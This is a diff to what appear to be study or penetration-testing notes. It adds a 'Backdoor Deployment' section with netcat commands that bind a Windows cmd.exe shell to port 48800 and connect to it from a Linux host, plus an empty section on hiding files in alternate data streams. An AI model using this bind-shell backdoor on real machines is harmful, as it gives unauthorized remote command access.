@@ -169,5 +169,22 @@ exploit
 ### Backdoor Deployment
 **Stations:**
 - station1 - Windows Workstation
-- 
+- station2 - Linux OS
+
+**Commands:**
+- Run netcat on station1:
+```
+nc -l -p 48800 -e <windows directory name>\system32\cmd.exe
+```
+
+- Run netcat on station2:
+```
+nc <ip address> 48800
+```
+
+### File Hiding with Alternate Data Streams
+- Using the `type` command to stream (hide) a file:
+```
+
+```
 
